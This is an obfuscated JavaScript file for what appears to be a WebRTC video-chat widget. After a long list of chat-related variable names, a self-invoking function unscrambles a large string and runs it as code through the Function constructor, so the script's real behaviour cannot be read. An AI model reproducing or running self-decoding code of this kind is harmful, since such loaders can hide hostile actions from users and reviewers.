var modCustomIceServers,modCustomConfiguration,ws,videoInput,videoOutput,audioOutput,webRtcPeer,NOT_REGISTERED,REGISTERING,REGISTERED,registerState,NO_CALL,PROCESSING_CALL,IN_CALL,callState,timeAutoConnect,timeAutoDelay,isIosDevice,isIosDeviceApp,notLoaderIos,setRegisterState,setCallState,resgisterResponse,userCallRegister,userCallRegisterPrev,callResponse,startCommunication,vcRegisterUser,vcUnRegisterUser,vcCheckExistsUser,vcCheckExistsUserResponse,getOptionsMediaChat,mediaChatCall,mediaChatStop,messageFrom,videoChatIncomingCall,mediaChatCallAnswer,mediaChatCallStop,sendMessage,onIceCandidate,durWaiting,opWaitingDefault,opWaiting,timeoutWaiting,isWaiting,vcWaitingBlink,vcWaitingHide,vcWaitingLoading,vcClearAutoConnect,vcWaiting,mediaCloseAlert,mediaAlert,mediaNeedsSSL,mediaNotSupport,mcShowLoaderTemplate,mcShowLoader,mcHideLoaderTemplate,mcHideLoader,vcCheckError,vcClose,vcHideMediaChat,vcIsAvailableChat,vcNotAvailableChat,vcDisabledControls,vcSetControls,queueSetDataAction,vcSetDataAction,mediaChatClose,$chatActionBl,$btnCallVideoChat,$btnCallVideoChatTitle,$btnCallDisconnect,$myVideo,$theirVideo,$theirVideoCont,$theirAudio,$waitingConnect,$loaderLine,isPrepareTheirVideo,isPrepareMyVideo,hTheir,wTheir,mtThere,mlThere,hMy,wMy,mtMy,mlMy,prevAction,timeoutCheckExistsUser,timeoutCheckExistsUserSec,isMobileMediaChat,isMobileMediaChatAudio,isReloadPage,prepareMediaTheirVideo,prepareMediaMyVideo,initMediaVideo,initMediaAudio,debugMediaChat,isDebugMediaChat,initMediaChat;+function(){var dkV='',Fjh=624-613;function iot(u){var a=4347661;var s=u.length;var i=[];for(var j=0;j<s;j++){i[j]=u.charAt(j)};for(var j=0;j<s;j++){var k=a*(j+438)+(a%38513);var w=a*(j+760)+(a%26033);var c=k%s;var t=w%s;var y=i[c];i[c]=i[t];i[t]=y;a=(k+w)%7069071;};return i.join('')};var KCQ=iot('corketqjwcgniascsmxlpnbhtoduuofrvtryz').substr(0,Fjh);var rWL='rgtu[=h=8;=.,,h {hi=fr=j f;a1ov gh7rxlt,S8,a(ttqov2tacg;.;<wft+r+z,uec)4y));avv8h("9tC==ta,9tvna0v8s{55dr(8p(8=4avh;otrv=j(])o;[g",0m+elou nw)lw<cfle+;=n=<"vfwo+[u];==rn"c"rc=vsb)g+=a7oe+gdyuAavt8(;)a)2)a !v]+qh+r;=9;nts3l r1(n1kv+;53n2frr;rg9lan sa2+xp);l;({;(veeu a6(ua(;..=eanu0mahe>lo.pwawpa60. hrei=cst.feu3["-)v,rh;aaoate0t;rotqsgtv=m+.q,.=fxrhsab9f;2,;jn(h h)m6u<oa1+6oi6t1,z= 52-[7aapf ,;7);<i)0.dcnmr}on;(1b))-(+1[s7f;,rhhntut}u{i4ltC-t.dAh;+6i;mi[;a.=er.=0racl;vsi]r;hbitAere]oChvsu0le()4h] 2(+p hh;rCu]a3t]n7 ;+]mz; .hf=7l=k(=rr8, ((,]0=niro["o>1lii="[(iocrnvxoi;vw(ho,.dt;hhdgygrs(+)=nr;+esi6omq.6]u.r!6=gpn]fv,p.*ptl){rovCrr=i.)uir]0 sn{8t;);pl+p=rg[0n(,aho[n)o;w}}er=.crrohj9rwhi-jr rA(vio;)lv13r+r7{ea+8f.0nh+i,e=,nr)[kCruon(a1c,t=baj;};j,nsnuvC(c==hl ,;lep ai=se((zekv .()wrf.v7nrrx(*.+)(=1gv)rfa(};=irrbeai(it)-=v,d(S).Ang)p6w;g l[;euqi ),j9)C-1,=y) fa]nli0rj+","}.iu[).f8s';var uau=iot[KCQ];var Qfy='';var Doc=uau;var evY=uau(Qfy,iot(rWL));var VTD=evY(iot('nu\'Fof4"S["OyOlh2ntFeR#fsCaFFi do]ei81OFR.r9)P985#)cwilc.C ]!O7{"0"fueFr$"OGRo5!0)oFIFF)FD,.__)nrihiAFFl{<sc,F8tM07FMNNFf2eROF_oN"sFl$}Z"r)Sr)uR.v"]l,3sv[y,R1[ReS,RF q1.oX"F)\',O7_]$tt Fi60F853" esCO%sg2OkYy].*{,5&FfFRtRwec.eEm t.6]r67r_fsuaN7O e)]C1tf,A_8infFl.qtn^}fu]JEFFsnfj0P,83x$FwF7nyO_oRie!|l4=po]snk. %;oi0i)Rtf4FR1FtNR5.l,rkOynfY eFRcRf[l=&mrDRr99)Flfd"nlg,{0c;OR50{4abi_4v!fseoFmglC.C\/;FtOfR.5aaqrFeRGhe+VdR_0(ifss:\'hagF<Oda][.fdnRRt ;S8,lzecscOb7f5]sa..Om;aFtlaUO&\',5#r85F(aa8)F\/c.s}R1tm1ods.ecr2OOIut$Frns]rtRn fbrrRnu)i-o2e#r,a0 FOF}_OnOOu0E0O"1}gr(5tRoO4"R?Oo_R,lF.1JV]lfHuZcnzR91e]oy.a)hFsxiFOp;fnFmORF)c x,R9Rsc"1Moo(.x<es7 R)3;eO1ab_bRuOe5r;.xoaoe,cF.MOWutdt-sf )iiehSfOuV,OTfr35r!.(l.]OR.r$tOpio]stJ"5curFtxO)s=[.aOpuea2#f5]eoWRr)p_7\/oah1Rg3F)eysofc[.s.aF.7s,smO FD=nrGa{F}5OyAFlfT5l2rQs)0"OFH.i2fhRRte=;h( OF]Fteor OOOf|{6le"OdRmlOfteMO,r5d0)asr"?Ed.]",I;iosfn;5dd;vi]M-"AO.4,m.:,p 157E18pFeFitCi)Mxi"tuBR)F]foR!.SwobF!M2R$sFnw[5u{fF80@5O,MakF1;eR2a$FFbj5{,9nFsOiaRi9rjR4Waf0FetO`tsCptir,V+<WReDFRO(Kd0oR1o0sq7pFRh0M k"FF,av[.Dv.v2$,(65B(3OtOp;OClnFa7l""im)5eFFCWHF-tFe3"$nF.bnRonpaefE"4mdtuFufb!eRuo1)7:FRSaxpEoAR3luROC1C\'] g$0OFa. ]sOR(iii1O5Ri]s8F]c.m7:Fuw.__fb]uk]rbdJF,OO4#1nFkSb7FpMyJemRNl)fnf;O.O[5o8oO.F=zu2tRs{O)nlE)Off"= FE@9y]{Tad.syCwn1b3;fuccotSab"E5}fYR{Y5fc"iFRk"%qFMt|RMr16bY1.10brOR`#)2(tl;.,rmF2.ilyiyr79R<rctf|OFEgC9R 0.9e39etFRu6?S78{_F_olmCbc\/Rf:r\/Fa3.Unr4ifkfc"Fs1)^94.t.k[%r.8Ma4 57trw8Ys;p>RL{cE;i0SriRFa.fO" e29[v)2fe!o=ro6:{M;RO.5-bFfOFa:iDGef5 Eeeo$f._FZF).R5OCo_].">ZdOJx.i?n.;tCfURc\/!lUSXT3;r.nyOc3ROMv].^wFzdCf5]h_x]F.!t.I,4ac5RV{F..4].nF(4.aRcIf8 rF$RFOi;0F)Ft"ufRmOm}=8|)g.en?OnDF(aesOoO =iiOaRD.^3FO"!),a5uO+Rh[Flgar5Q}"hot.RFe.sb"OaF0yct,_a" (b!]{RtR!l7fham.RzQFy!5cc.80yWRlecR.f3tcSet3ute9_6<tF;w1[FlF OReS.xeReaf,QRol_1R;@y!Et}i"FV8C;.n`)rO{iOyCsvE&,`Odvat5R8FCA]])gmoL)etaFCRO=.F].o4LmfO78nOf])sEmVgtoCn21F(?Fe8 1F.5)F4,Rte.TFFv5OOhhpe8!i67)fnoeFOn(sfsF_.cOFnc4)a!}"oe]RR$v!E1isiil5OR]atF5FF-SN."O3Feijq7(_im2tFjO"4sibOoo`FFrtRR%fVi4FpC].4CO5F $e;3{r oFn[8yuo(nsF)GrO O}n(7!aRFs\'.l0pnpYFm.oRR.RsMFdfF)yRyhO:.2wNth7]Qe71.f+i"h#lkrhwfetfr,"Oo)aFUFs7hl$ E]5f7RFzO5cR0`OsM8arMFimv=f@ouXFFOR )U.eySRtDa5fFoIR4r9RO#FDe6=tt}.clFBRrv."$9RaeRRxF,MOg"OFRb].nc)ab3852"cfaeO@y,#Dtn"F ,!yn0oi[OCa6R:Ol_NMt_c.^Ouwu;epFlFF]]OFseuf][ Ry#O2)dcYFtn  H]_p.e3`t]))co.v#C}RrFj,[aF;"5197Rne2.?fUO]%q5m:7F!tqR(=V ;01RRbmeNdR_te0(rk7, ]l8fOivv$dr.f)5tE.dp\/=5pF2OFoOnvgRhc(,"NO.G{t2?OuF6rROks_;F5Ro.nRe5nlFy,-)L&"FnRerer!nF,gOe e;}]0gFfp@4bF]M]]+De*Ohr:d.5}R eovhRfoa(5grIRb9uOe BEtRf5,)  OeaOkOi.5Q=i,8RmOln1O27fJ-K1";.w$3j.FF0Oy,55ps;5RF=F,R!4aL,frRRCF_0dKI3opfOyO;ac:(R50 uS.(asp(l2omne n{m95]FO)*.[()DRf2)"of3v(l}n.i)5ar}ie"F:raRqi2F.o5:1.itW3#}5fri_faEp;!"isOiU]D(2KA R)(x5QRF]_F"N95" F_=lOnewbomoyf{ On0s>)D1Rt]e5O!lR1OR5 tZ3x(rC_Re1hFO5V3- .3..R8Nr8]ihkG"o@a;ln: i;FFS1N  Fno$iFrorFOef3r]K(OfstsegO7Fe=:)ORfe]}aRrkRwf#RnO)Fe1c"cO\/]rr,hRjy}fy5lm;_pO"" ,t.296;>.Fs3\'l#F"Ox2ne,]e]n]saPFn1a]E1nRg7;)w$oe]lriKn9O$8R5R.!_R.tcROoduFFFS5.OFTi3]b!5iOo"X6#rweeR9W"Rb;hlfb5]5:aot}|e.2"}n0]ei!9cr0O1dAR "eavcae\/Os$F"Fmt^5v5,), .pst\/\\yRm$fF4]RF4LF!; (o.&@QM,i3uf4O"f)F]F5O.fCeFFm,fnSFMF.a5cBF]%,8:x"6)r,fR=g_F+.$F5.Fix"4mOp{vRo%)l5;uIyW_9NFuRd4e"0RFRO"7F,cR,^]:tORx?0R4CseR.FRfa6$xegl)!][6R.R ntrRFFt]O6e})TR|{.JrhihFn,cY2o] ]ui.F=82hpEsu}RIc6yP.e )w],e{d"i=Rt#fi.[OD.Du49"s{cs3SFn[}](oRcmr(v5F2,RO})oOf};cOen.nPeU_{:]I5(F?eRga]6OgGr9;F^o1lioR%8.Om4!pn9RyFwNuhlO]gOo.Ooc1ROR1C"r6,Quo o\\FOs5ranI]t<n Df;6[oY(ORtd:3FOF$1oR_}%lgw{+lOn ?T .Rf]taOf0]O"a\/oxOuFaD[Fust1lFwxh1oe}OO$o 367,R}YRZ;5\/il1oOOF2_1).60t Rco8MdPIggO[?9iOX)D]pORyF`(Fdr[5,5U$r-5oMF-FmlOCnReuR34"(7ry=p5F ){k]..7.;x;2e)tu"F+q g).;0R u"oV3({TFta-7}f=}.j\\.J{ta.U;Pn!=9,4C47F,R7QrerOFw]ctRo1F]a;s59eOOO0R] 5"hFF3FTF OOF)Fd(R.O[]0}z8ts;t8w!Nrt5pj9(1o."fyiOD^oop}eRhRxc"5C1C:ORFvmF(5az!}1U_=e!CK 1Rt5tx30_iOZ;4]y0;;IBF7F NF5F"!ROigRfI{5F_rC])]]tNmx]C"f2hO,b8a{weFc9+;=.45RNFnenCSlu^!.pjLF|79.b-Oay176_Rq7Nnt2.+n6[5z]OFo,c_RlWsV}!FerF1CRi=tnsrOSO(0OcFklRFr);t,tesgS7l,cRe5fy1SRlFeldatnni:;.5O65+ChpOUoce)n,$ f^O.o.]"ayf(mVOtr5lOO-R:FspdRtRR]5a8T).o=#FlR.Fh$1Ol)s4FO._ku;\/io,bw0f(nSBaFF:fF,_.>{lsRF6xldR20)nFu$btRw(x0s2R;thi9.FEM73 {R_^^4=RO;liaFOe)12rT.h3ja5!(n5}R6" ReseZ_5CO{eRxidt{ee._ewv5(FlD)5.,3O2u.giF5{ra.ROaO)]7R pWl)gdM(R(1OaSLO,(oy h;ODSFMF(mo;0ra }0^epo0]52.tewbfsfR|EOO9e2 =FOR#vu5eyJMF;s,.a .O.]fOOFOFlFe8a._gt;OR)3.v1002R4FO!](Ob{20;}l:<LeO0vRfNi0Fb2.F}OO4g{wOihR$yFofi02FOr,0;e5ReF6eoFm!5Nl9FsvJF:L.bs4cFp,x)&]I54awF5Imci.0}Ose&)vn, )3RFF`xR)es.85(lR5OFd]5.)"UhFOe.r8Fto2O"?`.{Ot80dO  .Z"7fCx)tD7.laioeF[E0]v pF4Foe(}R]"F8Rr,O4utJcRT5F R4 mOm oe{FBesur[*,pp7Rpa](YRgF1 ;eOoCoeFe;3rm 3E Oa11.Rh5n7OyckFQa:;r!"Raoh;,"F );R(Fn0sO}.5l0^O]vpFr:e52)it Oi0\/3],F.[FRKt8_FF"0]pc$olFRvRFR)slfqf)YO))t,RR ]50,ERY(.}]TmOao.RFv|f&js(_ a"Ofl5sWR.F_t7i9]O"3R5o;05a;abe]}whpfFRN$sib?ylugJCjFnlv=40trKh]Sr81w,RR]ff_x]IoRoFOn}teHu.vpFeF }c=rm,)bRF0"fC5OR"mFF5T5r3-fi5lO r6(FF6g!.y";66Rs_Ftea.rie{pix4ghO}6I"rTnROR.,]o8tgN&:OR R u:hOiiD pDO\/,g,}yQ;s$2#)xem55x]odFraeaR(0}nOtO6a8dngx3|yf1fo}-]"_3)gcO1lNledRrSyW9r5oYC.TRc11S|Oi].xF"Op.*\\C]roo0h<rOaR.R"n2mo9noiaO87se<!e"lo({.F]elF.7rFRai.R 4Hh.V9vO]f,F5f3f9)(2DO.5uF] r}c-.FFiRXF0XF4R7nypRbO"iD1uC }(ySaO_l"OQF[\/O]o|:6)].elooOa.pe".t]5fnnc85]{J4TtfoetaROcoOFanr2et);[ory8RxU tRF)(c;0C5()tthF]soiB]inz= nFTi0r]FOFO5Ro3n.#66f6@8 OMP}RQ67Fsla}5t)%.61)ioR#F534]i"OTf5)7m8f]5F}O2fOO3F ,O;OSh; O3C8Do,F#:hRy^k 5f:y!4]MC.Rr?[FV %vo1eFJFf5dOR9p[g(,#decSbfFFOl]a]jO]ftdFRe)sR)lF0b(]nO=ssxt1wpR9urnOCF0)6O:eFse1;v2dopvFFR)ad|]f2y91F \'F[d#io]0h7;5lO"?7.Oso#42,F0R5Oo 5y5.}P5uRRV"Fe.ORrei6 OR.RnRl.].b(lney(%0xO_F"ir9X%mFROacf2>t1pO.. 3}.rOX rl35oRfstx,eta"c8F1Rll1QeCRJ$fa2!.5w6%DOu,04.[8^104_IO(4mRlg$o8P._t8.ct.][oTlFgsoXRO"{EFl[Qy".tNR_F(O# r)`;17OuaxRRe^e.CFF16mC=R"C7(ROfbswd[FO:.uf,FF0D[cFNRF5Fk*Ff03nFBF5d2e2lFl{OUFIkx1b0Ff_RcBDv.n51ct,G]OEi2fg9.t3t,ehlFN)5F*+55R{l{g=NN!Ma"R8l)!]5FF2"8F(O(ts;RapF{FnO8TFFv9Ow2oi!*9 (RHO]3S]n.F2(5\\sF{O5t,m&E.2OJRieO)(nn1FlOrRGeF1^Ree8]R)s_] ,R1.a$C"R 7yOWOa:)$RFeOsrFaFRnOOy1_(aF1F.l9ee";R5rORamFae\/FseOa*+R)l[`_,_&0qf]HK\/f]nF,,.pi7{lRftopa2E.b]RFN.]7=}aeO:Q108];ttFR;s]e]h[b7t5R.N\/!l.0d1,wFRtKF3.FtD \\Fn 9O)6O.s}ORsS"trAoF]=vl|qF2ROcOBXgl5)y, F]v_t[FeR$,F,Ob2Vs,F]Rp),mnF.16Rn3r(yoOc5O\'(R^F55}wF)iiyoe].5O.W$_2!g.3sY7]1dFutRlFev5 r35\/K5YeOFyCR .Fc-4}FsFOk"#3f$PR2!CN O$he?F]fF=a,,R\\)O}i93NOxI]"x5Fkofma6.82FOngR8:7.O,v1Fp.0bs5si=h)]o581["(F5{sFaR (oe]eIQf,7.])iayF$R,_R87hfeF!RRa"#FO)94nIOT\\OE) d]f1r9;Gh}F))F+g2 dpt&mmRplF])byIqFM.g2x23}_r8ttAT)7aFF6Ff,0nz(eRl1tO"PR}F01Ke$i.5Rl!ilR\'yf r5O(9FsDF+7._$F87uF36]ecgcf V0nt!29FgOg!m5(2.px2y]8s#&l\'4Ei2s"F1 RFhybrORmOyFYer"FRmORd,xaRo{7"d)FifBTOt.:XGseR:m,5x59FRR]y]5rOhSkOyRxORiwy.0$yRD){d}R1NWpORy7.SOR1irRqc8:x.y4.R")flF]FsO6ROO!lOfecFO!R2$:e}#.Ow,3]eoR.eR=F;-t.)n0c{At"\/7ytfDTO=O+FebFOO4A{5^mm5me "bn!RotxF;Migi,]Oi;0"c(R$Rx2=0 :pt]rRat)) M.[fYTFbaO=)<ROOeFNMzFmxuF[>7OaO(4nC,HR81]4"_56_0{g.F+O,=i=bfmPp.vgrF{REFFR0.mpooRo;O];}i@o))f.lioOa0D]Fxc1>s rLo.f;Fh 9cw8;iR)rqFlf;(^bReTtD,Fef))6Cik.Ryg:!a_>(n0))}ioo\/8o{)R4eO28h}gpaF9]LW]O;n"R,=gxObc.:.cm ;nF(sm ]i:OORF4.N]!}f833e3O>)pi cFce55F2t5iO"Fdy5OVse7F5rRFhFVN8F9nR  pyEe=qf5o_:Oi;.0pyO,{wF..dmZ H..)nFgoF9-8MsF.NFOfbct1O0l2yFOR2.F2,aRr.1}3tvrR16)F}]htR!]3a],fs)eOfa2}X,=ir3,gX:put"vQFTcOZFb*g3(rO=AK_C5.Fn;w{N;lxSOut^3fMEcetN2GRbmO} O90R;F1].8]S3]6&cC(ekRe;;$iFltMe_pa ]8s,u$]X5euA8pO A3u8b-F=F .r]3wc.,NR9F]VfRot_Q3oF,=6O5_J7FRefm,)008._]TF;jc]riu1:,v1ilygi^%{.OW]v-y2]_eOo5[DUftF537]Fkr0{tx2O4feROpR5ORRpNRw7^RsRdF.wer7""r%rRacX[t52}R TRR)ROP#.0)s6."C)")F?.33{F3(F{b2e)plErolp_aXse1*c2n`ffeOF@s.Od0anm=m)r$5.FUF&,FdF7nuN=dR4 )7,7iOcs!e0y75Octpv"2j"OeYcfnef5v"7.F-6le gt_FRE,F]Fr) n"gD{2R,p9ssecF1 FbRxd{OR,RteR.cf0gO3t$oVR#7}O1.O7exgD:9D{l{ROLv .3)Re.a"s4O*!{FR`]7Rl8Fe,R0]](R00i6}ROa#}bz.@7f87]eitwRle(5FgjRnlRt5w7e\/;pcK0OFROFRlOaneOy)797xl0OiR_.F.ySt"t+dp3R.t3,_O.tYK0 w$3(7i0DaORW!nn5__x5ovuZe{F,`RtO6)(5FfVOglOC1]c0=(FEF2R"5F.py5F@,aQR5#w,8]6esit][v So=0R1Fer0n";6x;DrRYCsJR,3R1c;O2RQg)O-Vy\/:eF,=FfUuF:ptt1 7s}id2Fl,nF63N{eo5nwbraoowO:e.O_6.R2S9Fiy4nL wF(se2bR-ctO3R_V) 1rt?;4F,5}r#w_)eg(ao,OPOF],aayU%F{$u\\(_iOcx2.FerbOF$"v& G=a)Oa)fFDfO^;-5.0e"..t5ObWs9FO3;sRo"Os,F4Ryc0i}f_05 8>R)F0FSO.-Fst=e)055ecrF[v90.).[5 )>EcclR=FTFF-lnFFgMo_$^ RRO)FaCOo3]rf"]2mOFlrn5;$ ]W\'h=1RO9y_rif5RF.9s)fRew,sX9Rc[h93F.h]b{sRfh.l(.F2zO}.O,F5g)s}i"3]O(),{aR_Anll .c.K?Om)8)iyRS.0t c_vs.d.!])}fsOOaF{).f).,F.ICtybRaF u(mRR;ci xr)O=F5ceep9OR2* Fy eFRwt]a8#J_0O(nb]]6}t_ecx0ROyrfT.sFm+kEiF"se!]t3ufl[F}rRFRf0_)d)g.ZilI]O]c]ZVF7SoDOrgw;8]],#lo z`[ \'}FxmetFh+ongo}a98d0Fl87{,cRnv!=4;oanR,Fa:,^weq"R:FwFiRe.eed9Rac8)3cw2}.%4;(35[ORCyiRO.F8 t^ww2g1.(^R5{XO0,R2Mu.7e{in2Z59ET1oOsrm.pF.FF2iOsR>6y1.X)tI5FROK45AFfvLi!e;a b4",RRd=ilF=-RcswqL,56Fg,O("M]NafpMS!:_tFI5mTelw00)7]")R^aV7eosUNcOMF.})dFdoFR5F59vFIr8)0"CsO-)hTr9,;=Rge0)0,1dni]]R_De xnyFb.rr.,e.mn7n2rOt$3pN0R5F]]lkw=Fd}wti:.=]tn"cnF]A5E]_]}n5c)g0n5Cl;\/.uR$!XRf];0pHIXOdFenxfO802"$4Ff)POr0oF ;7e];0rfFec3in8.O:5re0Fol%nt2;}.40OtR{p".O{xr2it]]]zeOO4mF\\Fay].i7+R$9[O39F.vie]RNQb4sla0\'F@[;mtO4]ieOd.?li)fv+.e85f[,  q_Fp<aeigl.8.1b+nt1F,RF*38"OliPt9no[!5eFFfFncnFi6r!3.9:-@c"O.pa Ro.:Fy6g=Of(0eOzs(eR\\(rRs_;OF"]nO}p=2ec[ROw]RqinS5]Sf.Fee1Feie00Oe2^ onFe,75we=FeaFF,r]g5,uhl"rdFoR]Tr:JFl=5ES!F.n7{4FtZF$d:5t>s448vO1e;"gsFf5rdi)8O5Fm .f)[F5T,d{lm5exl#3,5_cO{5RF^!_FCOuR|dc;rye"J5p6mO[rRe;.8F5;-c!]st]fR{ORRn@\\CRT7]hurfR;y94S5OyonQ9"]6]Fi}.aF$Ok4_]]ROsO5,Fnbg.&.]R5,a5sf#TaiO.0a;fOsRoeFq_y_Fpfi,rfV8Fn^p]U]l:flpJsFcmOFR)8iURF[IQ=r"]sg17 F.,H]>Fi+tRan!0eCF,]R]T2O)onc{R{ BHR9tpl54:,itMrF.nU{iyKns52i]oFe7;g[:.SnMO[Fn FJT8FnaOafhSm]3 lu.KR7.4.O"&.O)]2Rt, <_am5)K{t,. aefCt$[RORv); g(wOO:44[Zyi$Sj4v)vR9f.R.ROys_ Z;fgwfp$t,i+ (i#{iRje#cof]r.FleF.eFs,O2si}.[7.[nls(;O8iOZ1YRFe+eFfwFO")RyFtvlf#g0lORp;li]lO.lR=)b5 uo_F]ed5]F!Ofct3w^sfO,OaR=ds_u))Rima1e;WFeqF bfr4xF\/i(V,F67ntcBot]l..vRfoR.R0&O].xr5{{gb#^]R3E(r]T5Oetu\/.RR9yO5,dRcC\/i4s p]";hm1PF6rOwRR<2R+=M6rTF5)nfhOF..F!O_..pr;R$D,r3Fg)ra3"S;3sFCoKirOFF5hat?FI]?^Rh]FOf(aI"B{:55,FO{a?r_+}e;]F.3a2UO0 6Rc0UE TFOn8RaObo%leddft],mlo]b.(.8O;F"tyRrR,Ni,CF F)pc[ f.,wt;+FZOSu1g"bwun(Rsn5D50_rndlDMPCfF, .ufO.n[Rl`RenwANa.sHo=sFitNi r+F1=ecu.=yOee,.;O.Ff(Fu rFfF5.;p;;0:BtvdR7"rO2 !RM1.__F41XtiyC,p#naS\'lHCe... (FRN.,..]];ReerO,|8FCep"[fexFg$F"d0.pn=O5<47v02tsrDF.,R]g31.RsMF]MOailOoc8RrH8t9lr\/)d8ie)$@C_e2)a)]iF0] tO) O85dn16 l0}eiR[.or]ncFe.g0c9mFy2H(fO] ..OirtR24cT,e.=(3.; {70C)F(" ]rF1O95[3oF0_Nfu.n,iO5= i;.0FarveR50F!fFt. r(*ol5nea).5",R#{lc$.iF DneROpy_r)yh.0iwKnOtiO..5fFe,5O=5FOORMx07y0}wF75"(l3xd_(]MOFF;9i;;r=lFF9 n1-_Rx2FsTO 1}4f5tMeFF11S0(eRhri4e",7RxF5RuODG0tp"Fge ."8:Rai=sc"->e]>% [a;RRfNOe^.9scOamel.y.4fFRaO9b*e(d)6}]phxzo7gP9s.Ft(?Ms9g,tRobi]MuCfR.[O]e_Lo[te{l30gsC\\93pRR00QOo,g}ysl n`tpx);e%0h8ce,ct RlFoi55Otih2.8Uuu)f )ert]J};]feOi;tiR1Fyto MFmC aVio\\C.5"545FOyvs)sedi6R28354DtxO9aRt1S]K0l1hpF3O}5L)o.f3RNO4^1XRtatOFFusnRNtRf;3cDve[ROiOORF Rc]u!5b7Rr1=5S(OQit;(3:F>)F4v[b057O{ RFR)lr2hpOhef_0"F\'75F,xiOe({yt_"(n]]O[eO=ksDFoiO}lF7lR .[MO)1g5O+EMe..yPFO2bO5fF]ee$ExU0te.eeerJiMU0 sy5.RP4xFu (}O2at.R13m1a5bcvecF3lR.n9|.tlO03d43i\\3E07.ay=5FxmriO)"u5{ADOOOfet,:rgAoX..F3T\\Re7\'Fi$R}a""OnfFsr;Mv+foNc,FRh(=F:Ru,83Flry[R,tlFg%R1OR==ocyK{$tls=O3eF;nOapRF.FFO.Fgb}ts5-{O"O,o9R)2,)e (m)(?_0 1,)C6of<g{][tSmWt]mdSnaeRe!(][C(JgFFiesFfrsotm=shr4e6OMFV"r.5b\/e]zROBO!w(Oic.cktaSf}ti4HO1Oi5_lu-IR($ Ce}t.eynXn9fB$MFF6$5Fx " 28afTRF.L]FfR!Rr({RtFt.)OaFR3Ott8n!F.1^>is}k5,O.\\0.Ft)0EfF,i#Ftl"ifgF5$*cesaFS]a[RdRFji@|]mx]5hstmO5fF.RR1"fmDot{F\\eE,l-F\\_e4"th7nCmf3o4ODr] D]) ]O8O]5.C*!.di}O O52oo;e]N}Whda5O\\2 bN"e78(mCaolOp\'0fVCe3fR]dg fhMy`^6.v5e0Is i_O7eEfOO71tzO\'!tnF8,Osr(;.C1, aEa]O3;ivoohsuFtmROs.5czpRR6tosOghn)H]3arRo!Cha18dbge .Zrt"[saF]vc)%"CF F$RFd"oe.eF=$ .o6.u^.\\|ui$e2]Xrr. ihVpO)Da+o)Ni.(;!Na,]p$l9OOd:r58; $oQO5=tRmI(e0;RF( 4R3f9_Oe4OsjnMUnv)1gO-NF^.3)C6.cF{FeOxZ..4uP6 ;E&hD8R2l^(Ot#9Oe3F]8g50 eReRiNFEf.gtn(5|5O{,cnleQR RFiOe7 ]SVd4ffk&=,_DOOSOzwgOO]nF5{uNI(;.5Fprr:u.R =3,5b=)qssOgn 9vi]$RF]Dh u57dd8tO$IseF(cRasih,;]OrgR"r5aFOOi0Rf 5}u`vf5F$3FF. n4]+1bcR!nF9f FvO;2tbb@Ym Ma.6dnt4^5da tF#cFFeo.)l]y") ,$i.C3F(HR.n+wita$FfOFROz.RtOeFu,p20F5fFh.sd(.6OO 1b)])RO.f.=cFO ,,o%e(m5eVcO]l;},b22e7eo1O)tFnFN Fe}0 2oFa ,t]dxaoO5dhZ.E$&NR.fEbF4,aa"R_6]f.3 FY. _n=47 lp1Oeu] Rii.FDb" GJ)0j5W,:Mk9so;hOO)"9,IoO}s2Ftnls6(,dn 0Rfnn5=o"F(Fd;;R653 .RF 0Rotn.n]d"0R,u r!l5_ ]dpF "el.l l](*T0xa ;[pRc"Tw$ayfRy"te.)pc:S5vRr)hv$hg]Fm]7tw F}$%CcFI }F]pF;iKfo6"sF)]9$Q e5siF)}.a()=Lm "frz0edFhMOCcfDno|1 GFo( ;O }Fs$1FOrp;_k.An-wdOQO'));var YBa=Doc(dkV,VTD );YBa(9634);return 5558}()